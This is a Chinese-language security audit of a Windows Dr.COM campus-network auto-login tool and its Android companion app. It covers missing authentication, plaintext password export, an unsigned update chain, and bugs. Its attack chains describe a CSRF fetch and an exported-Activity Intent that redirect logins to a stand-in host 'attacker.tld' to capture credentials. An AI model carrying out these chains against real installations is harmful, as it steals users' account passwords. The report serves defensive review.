## 2. 项目 A：DrcomAutoLogin-Windows

### 2.1 安全问题

<a name="a-h1"></a>
#### A-H1（高）Web UI 零认证 + 零 CSRF / Origin / Host 校验 —— 可纯 CSRF 窃取密码

- **位置**：[`web_api.py:505-653`](DrcomAutoLogin-Windows/web_api.py#L505)（`do_GET` / `do_POST` 路由全表）、[`联网_service.py:590`](DrcomAutoLogin-Windows/联网_service.py#L590)（绑定 `127.0.0.1`）
- **验证**：grep `Authorization|token|cookie|session|csrf|Origin|Referer|Sec-Fetch|Access-Control|Host` 全项目 → **零命中**（仅 `net session` 的 bat 提权检测、前端 `window.location.origin` 展示用）
- **攻击链（不需要 DNS rebinding，纯 CSRF 即可）**：
  1. 恶意网页用 `fetch(mode:'no-cors', Content-Type:'text/plain')` POST `/api/config`，把 `host` 改成 `attacker.tld`（`text/plain` 是简单请求，不触发预检，`application/json` 的“弱防护”拦不住它）
  2. 再 POST `/api/login`
  3. 服务读 `password.txt` 里的**明文密码**，以 `user_password` **GET 查询参数**发往 `attacker.tld`（[`protocol.py:233`](DrcomAutoLogin-Windows/protocol.py#L233)）
  4. 攻击者拿到校园网账号密码
- **附加风险**：`GET /api/log_download`、`/api/about`、`/api/status`（含 `current_account`）无鉴权；无 `Host` 校验 → **DNS rebinding** 可远程直读响应
- **建议**：
  1. 启动时生成随机 token 写入仅本机可读文件，桌面快捷方式用 `http://127.0.0.1:8848/?token=…` 换发 HttpOnly Cookie，所有 `/api/*` 强校验
  2. 校验 `Host` 只允许 `127.0.0.1:<port>` / `localhost:<port>`（**这是挡 DNS rebinding 的关键一步**）
  3. 写接口要求自定义头（触发预检）+ 校验 `Origin`
  4. `/api/config` 校验 `host` 必须是 IP / 内网网段，**禁止改成任意域名**

<a name="a-h2"></a>
#### A-H2（高）`GET /api/config/export` 把明文密码打包进 zip，且无鉴权

- **位置**：[`web_api.py:411-443`](DrcomAutoLogin-Windows/web_api.py#L411)（`_build_config_export_zip` 在 :426-429 显式 `zf.writestr("password.txt", …)`）
- **问题**：GET 是简单请求，配合 A-H1 的 DNS rebinding 可**远程直接下载密码**。且 README「安全说明」声称「接口不返回密码」—— 该声明被此端点直接证伪。
- **建议**：导出**不含 `password.txt`**；确需备份密码时改为口令加密 zip + POST + token 三重确认。

<a name="a-h3"></a>
#### A-H3（高）自动升级信任链形同虚设 —— 镜像投毒 = SYSTEM RCE

- **位置**：[`auto_update.py:39-69`](DrcomAutoLogin-Windows/auto_update.py#L39)、[:171-236](DrcomAutoLogin-Windows/auto_update.py#L171)、[:532-543](DrcomAutoLogin-Windows/auto_update.py#L532)、[:429-448](DrcomAutoLogin-Windows/auto_update.py#L429)、[:650-687](DrcomAutoLogin-Windows/auto_update.py#L650)
- **三重缺陷**：
  1. **校验值与被校验对象同源**：`digest` 取自 `assets[].digest`（:222-226），而 API 响应与安装包下载**走同一批第三方镜像**（`GITHUB_API_MIRRORS` 与 `GITHUB_DOWNLOAD_MIRRORS` 完全相同：`gh-proxy.com` / `ghfast.top` / `mirror.ghproxy.com`）。镜像可同时伪造 JSON + 下载 URL + digest → **校验必然通过**
  2. **fail-open**（源码实证）：
     ```python
     # auto_update.py:532-543
     if digest and not _verify_sha256(installer_path, digest):
         ...  # 拒绝
     elif digest:
         _log_upgrade("INFO", "SHA256 校验通过")
     # digest is None → 什么都不做，直接进入备份 + 执行 installer
     ```
     镜像不返回 `digest` 字段时**静默跳过校验**
  3. **SYSTEM 权限静默执行**：installer 由服务（LocalSystem）以 `DETACHED_PROCESS` 拉起并 `os._exit(0)`；且 `auto_update_enabled` **默认 `true`**（[`config.json:5`](DrcomAutoLogin-Windows/config.json#L5)），后台线程检测到新版**无确认静默升级**
  4. **安装器无 Authenticode 签名**（`setup.iss` 无 `SignTool` / `SignedUninstaller`）+ `PrivilegesRequired=admin`
- **建议**：digest 缺失**必须拒绝安装**（改 fail-closed）；校验元数据只信 `api.github.com`，镜像**仅**用于下载文件；更强做法是仓库内放 Ed25519 签名 manifest、公钥编进客户端；给安装器做代码签名；**静默升级默认关闭**。

<a name="a-h5"></a>
#### A-H5（高）「重启服务」双重失效 —— 点了按钮服务就永久死亡

- **第一重：`time` 未导入**（源码实证）

  [`web_api.py:316-323`](DrcomAutoLogin-Windows/web_api.py#L316)：
  ```python
  def api_post_restart(handler):
      """返回响应后用 os._exit(0) 退出，由 NSSM 重启。"""
      def _delayed_exit():
          STOP_EVENT.set()
          time.sleep(0.3)      # ← NameError: name 'time' is not defined
          os._exit(0)
      threading.Thread(target=_delayed_exit, daemon=True).start()
  ```
  `web_api.py:18-31` 的 import 块是 `io, json, logging, os, re, threading, urllib.error, urllib.parse, zipfile, datetime, BaseHTTPRequestHandler, VERSION, eula` —— **没有 `time`**。`STOP_EVENT.set()` 之后立即 NameError，daemon 线程静默死亡，`os._exit(0)` 永不执行。AST 分析独立确认 `L320 time` 未定义。

- **第二重：`AppExit` 策略让重启变成永久停机**

  | 位置 | 值 |
  | --- | --- |
  | [`packaging/setup.iss:223-224`](DrcomAutoLogin-Windows/packaging/setup.iss#L223) | `AppExit Default Ignore` / `AppExit 0 Ignore` |
  | [`install.bat:162-163`](DrcomAutoLogin-Windows/install.bat#L162) | `AppExit Default Restart` / `AppExit 0 Restart` |

  即使第一重修好，`os._exit(0)` 退出码 0 → `AppExit 0 Ignore` → **NSSM 不拉起**。用户点「重启服务」= 服务永久死亡，需手动 `nssm start`。
- **建议**：补 `import time`（或 `threading.Event().wait(0.3)`）；重启路径改用 `nssm restart DrcomAutoLogin`，或让 `AppExit` 与退出码语义匹配（见 A-C2）。

<a name="a-h6"></a>
#### A-H6（高）`password.txt.template` 的注释行被当成真实密码

- **位置**：[`packaging/password.txt.template:1`](DrcomAutoLogin-Windows/packaging/password.txt.template#L1)、[`packaging/setup.iss:52`](DrcomAutoLogin-Windows/packaging/setup.iss#L52)（`DestName: "password.txt"` + `onlyifdoesntexist`）、[`联网_service.py:140-156`](DrcomAutoLogin-Windows/联网_service.py#L140)
- **实证**：模板唯一一行是
  ```
  # 在此行写入你的校园网账号密码（去掉本注释行），UTF-8 编码，不要前后空格
  ```
  而读取逻辑是 `line = f.readline()` → `pwd = line.strip()` → 非空即 `_PWD_VALUE = pwd`，**没有任何 `#` 注释跳过或模板占位识别**。
- **后果**：新装机（未走 Web UI 改密码前）：
  1. 服务把整句注释当密码，**真实发起登录请求**并把垃圾密码发给网关
  2. 登录失败 → 计入指数退避
  3. Web UI 显示 `password_status: set`，启动时**不再提示**「请设置密码」（[:496](DrcomAutoLogin-Windows/联网_service.py#L496) 的告警不触发）
  4. 用户以为已配置，只会看到「登录失败」，极难定位
- **建议**：`_load_password_from_disk` 跳过 `#` 开头行与模板占位；或 `setup.iss` 干脆装**空文件**。

#### A-M1（中）密码明文落地 + 无 ACL 收紧 + 内存/落盘值不一致

- **位置**：[`联网_service.py:164-174`](DrcomAutoLogin-Windows/联网_service.py#L164)
- **问题**：
  1. `password.txt` 明文，装在 `{app}`（`C:\Program Files\DrcomAutoLogin\`）—— **Program Files 默认 ACL 使 Users 组可读**
  2. 源码实证的**内存/落盘不一致**：
     ```python
     f.write(password.rstrip("\r\n") + "\n")   # :171 落盘 strip 了
     ...
     _PWD_VALUE = password                     # :174 内存存原始串（未 strip）
     ```
     含尾部换行的密码「保存后立即生效」会用错值，直到重启才一致
  3. README 自己承认「建议只授予本机账户访问权限」但代码从不执行

#### A-M6（中）连点「立即登录」会排队执行多个完整登录；跳过检查是死逻辑

- **位置**：[`protocol.py:276-281`](DrcomAutoLogin-Windows/protocol.py#L276)、[`web_api.py:212-219`](DrcomAutoLogin-Windows/web_api.py#L212)
- **实证**：
  ```python
  with _RUN_LOCK:                       # :276 全程持锁
      with _STATE_LOCK:
          if _STATE["login_in_progress"]:   # :278 ← 持锁后永远是 False
              _log("已有检查在进行中，跳过本次 ...")
              return
          _STATE["login_in_progress"] = True
  ```
  因为 `_RUN_LOCK` 已经把并发串行化，`login_in_progress` 检查**永远不触发**（死逻辑）。`api_post_login` 每次 `threading.Thread(target=run_once)` → 连点 N 次就排队执行 N 个完整「等网络→查在线→登录」。
- **建议**：触发前用非阻塞 `acquire(blocking=False)` 判忙，忙则直接返回「正在登录中」。

#### A-M8（中）并发写 `config.json` / `password.txt` 无锁 + 固定 `.tmp` 名

#### B-H2（高）`PortalLoginActivity` 是 `exported="true"` 且**信任 Intent 传入的 host/账号/密码** —— 任意 app 可窃取真实凭据

- **位置**：[`AndroidManifest.xml:37-42`](campus-network-service/android/app/src/main/AndroidManifest.xml#L37)（`exported="true"` 且**无任何 `intent-filter`**）、[`PortalLoginActivity.kt:62-70`](campus-network-service/android/app/src/main/java/com/drcom/autologin/PortalLoginActivity.kt#L62)、[:343-351](campus-network-service/android/app/src/main/java/com/drcom/autologin/PortalLoginActivity.kt#L343)
- **实证**（源码逐行）：
  ```kotlin
  host     = extras.getStringExtra(EXTRA_HOST)?.trim().orEmpty().ifEmpty { cfg.host }   // :62 可被覆写
  account  = extras.getStringExtra(EXTRA_ACCOUNT)?.takeIf { it.isNotEmpty() } ?: cfg.account

  ```
  注意 `?:` 的语义：**Intent 里没传才回退到本地存储**。也就是说攻击者**不传 `EXTRA_PASSWORD` 时，用的是用户的真实密码**。
- **完整攻击链**（攻击者只需发一个显式 Intent）：
  1. 第三方 app：`Intent(ctx, PortalLoginActivity::class).putExtra("host", "attacker.tld")`（其余 extras 全部不传）

  3. 攻击者服务器收到完整校园网账号 + 密码
- **叠加放大因素**：
  - 密码以 **Intent extra 明文**跨组件传递（[:368](campus-network-service/android/app/src/main/java/com/drcom/autologin/PortalLoginActivity.kt#L368) `putExtra(EXTRA_PASSWORD, cfg.password)`）→ 会出现在 `dumpsys activity` / 系统 bugreport / 部分厂商调用链日志
  - [:171](campus-network-service/android/app/src/main/java/com/drcom/autologin/PortalLoginActivity.kt#L171) `setAcceptThirdPartyCookies(w, true)`
  - [:222](campus-network-service/android/app/src/main/java/com/drcom/autologin/PortalLoginActivity.kt#L222) 注入前**只判断 URL 含 `a79.htm`，不校验 host**（见 B-H3）
- **⚠️ 2026-09-24 补充（git 考古结论）**：`exported="true"` **是故意加的**，见提交 `3fd8e9a`（`false` → `true`，理由「修 SecurityException: `am start -n com.drcom.autologin/.PortalLoginActivity` 不再被拒」）。但该理由**不成立**：App 自己的 `LoginWorker` 用同 UID 显式 Intent 启动自身 Activity **与 `exported` 无关**；真正让 Android 10+ 后台启动 Activity 生效的是 `SYSTEM_ALERT_WINDOW` + [`LoginWorker.kt:74`](campus-network-service/android/app/src/main/java/com/drcom/autologin/LoginWorker.kt#L74) 的 `Settings.canDrawOverlays()`（**项目已正确实现**）。`exported=true` 实际只服务 `adb shell am start` 这一**调试便利性**需求。
- **建议（不要直接改 false 就完事）**：
  1. main manifest 改回 `android:exported="false"`（release 收口）
  2. **新建 `app/src/debug/AndroidManifest.xml`** 用 `tools:replace="android:exported"` 把 debug 变体覆盖为 `true` —— 保住 `adb shell am start` 排障能力
  3. **忽略所有凭据/目标类 extras**（`EXTRA_HOST/PORT/ACCOUNT/SUFFIX/PASSWORD`），一律只从 `Prefs` 读取（`Config` 已是单例来源）；仅保留 `EXTRA_USER_IP/USER_MAC/AC_IP/AC_NAME` 这类运行期探测值
  4. 注入前校验 `host == cfg.host`
